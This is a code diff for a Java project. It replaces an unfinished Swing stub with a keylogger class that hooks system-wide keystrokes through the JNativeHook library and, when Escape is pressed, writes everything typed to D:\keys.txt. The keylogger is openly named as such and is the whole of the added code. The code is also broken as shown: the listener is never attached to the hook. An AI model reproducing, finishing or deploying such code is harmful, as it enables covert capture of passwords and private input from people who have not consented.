@@ -1,87 +1,119 @@
-// dang cai API nen chua lam dc
-package com.mycompany.sever;
-import java.awt.image.BufferedImage;
-import java.io.ByteArrayInputStream;
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
+package javaapplication3;
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
 import java.io.File;
-import java.io.IOException;
-import java.net.ServerSocket;
-import java.net.Socket;
-import java.nio.ByteBuffer;
-import java.util.logging.Level;
-import java.util.logging.Logger;
-import javax.imageio.ImageIO;
-import javax.swing.ImageIcon;
-import javax.swing.JFrame;
-import javax.swing.JLabel;
-import javax.swing.JOptionPane;
-import com.sun.
-public class keylog extends javax.swing.JFrame {
-    /**
-     * Creates new form sever
-     */
-    public class appstart{
-        public static String str;
-        //private static ASCIIEncoding encoding=new ASCIIEncoding();
-        public static String path="fileKeyLog.txt";
-        public static void OnTimedEvent(java.awt.event.ActionEvent evt)
-        {
-           // str= Files.readAllLines(appstart.path,encoding);
+import java.io.FileWriter;
+
+public class Keylog_sever implements NativeKeyListener {
+    
+    static String s = "";
+    boolean st;
+
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        // System.out.println("Key Pressed: " +
+        // NativeKeyEvent.getKeyText(e.getKeyCode()));
+
+        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
+            st = true;
         }
-    }
-    public class InterceptKeys
-    {
-        public class Native{
-            public native void doSomeNativeWork();
-            static {
-                System.loadLibrary("user32.dll");
+
+        if (st == false) {
+            s = s + NativeKeyEvent.getKeyText(e.getKeyCode());
+        }
+
+        if (e.getKeyCode() == e.VC_1 && st) {
+
+            s = s + "!";
+
+        }
+        if (e.getKeyCode() == e.VC_2 && st) {
+
+            s = s + "@";
+
+        }
+        if (e.getKeyCode() == e.VC_3 && st) {
+
+            s = s + "#";
+
+        }
+        if (e.getKeyCode() == e.VC_4 && st) {
+
+            s = s + "$";
+
+        }
+        if (e.getKeyCode() == e.VC_5 && st) {
+
+            s = s + "%";
+
+        }
+        if (e.getKeyCode() == e.VC_6 && st) {
+
+            s = s + "^";
+
+        }
+        if (e.getKeyCode() == e.VC_7 && st) {
+
+            s = s + "&";
+
+        }
+        if (e.getKeyCode() == e.VC_8 && st) {
+
+            s = s + "*";
+
+        }
+        if (e.getKeyCode() == e.VC_9 && st) {
+
+            s = s + "(";
+
+        }
+        if (e.getKeyCode() == e.VC_0 && st) {
+
+            s = s + ")";
+
+        }
+
+
+        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+            try {
+                File f = new File("D:\\keys.txt");
+                FileWriter fw = new FileWriter(f);
+                fw.write(s);
+                fw.close();
+
+                GlobalScreen.unregisterNativeHook();
+            } catch (Exception ef) {
             }
-
-        private static final int  Wh_KEYBOARD_LL = 13;
-            private static final int Wh_KEYDOWN = 0x0100;
-
-
         }
     }
 
-    /**
-     * @param args the command line arguments
-     */
-//    public static void main(String args[]) {
-//        /* Set the Nimbus look and feel */
-//        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
-//        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
-//         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html
-//         */
-//        try {
-//            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
-//                if ("Nimbus".equals(info.getName())) {
-//                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
-//                    break;
-//                }
-//            }
-//        } catch (ClassNotFoundException ex) {
-//            java.util.logging.Logger.getLogger(server.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-//        } catch (InstantiationException ex) {
-//            java.util.logging.Logger.getLogger(server.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-//        } catch (IllegalAccessException ex) {
-//            java.util.logging.Logger.getLogger(server.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-//        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
-//            java.util.logging.Logger.getLogger(server.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-//        }
-//        //</editor-fold>
-//        //</editor-fold>
-//
-//        /* Create and display the form */
-//        java.awt.EventQueue.invokeLater(new Runnable() {
-//            public void run() {
-//                new server().setVisible(true);
-//            }
-//        });
-//    }
+   
+    public void nativeKeyReleased(NativeKeyEvent e) {
+         System.out.println("Key Released: " +
+         NativeKeyEvent.getKeyText(e.getKeyCode()));
+        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
+            st = false;
+        }
+    }
 
-    // Variables declaration - do not modify//GEN-BEGIN:variables
-    private javax.swing.JButton openserver;
-    // End of variables declaration//GEN-END:variables
+  
+    public void nativeKeyTyped(NativeKeyEvent e) {
+         System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
+    }
+
+    public static void main(String[] args) throws Exception {
+        try {
+            
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException ex) {
+            
+            System.err.println("There was a problem registering the native hook.");
+            System.err.println(ex.getMessage());
+            System.exit(1);
+        }
+    }
 }
+
